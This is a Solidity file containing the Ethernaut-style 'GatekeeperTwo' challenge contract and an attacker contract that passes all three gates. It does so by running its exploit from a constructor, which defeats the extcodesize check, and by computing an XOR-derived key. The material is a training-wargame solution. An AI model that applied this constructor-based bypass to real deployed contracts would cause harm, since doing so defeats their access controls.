// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                uint64(0) - 1
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract AttackGatekeeperTwo {
    // Having all logic in the constructor passes gateTwo() because during
    // deployment, runtime code is empty/
    constructor(address _victimAddress) public {
        // a ^ b = c then a ^ c = b
        bytes8 _key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success, ) = _victimAddress.call(payload);
        require(success, "Call failed..");
    }
}
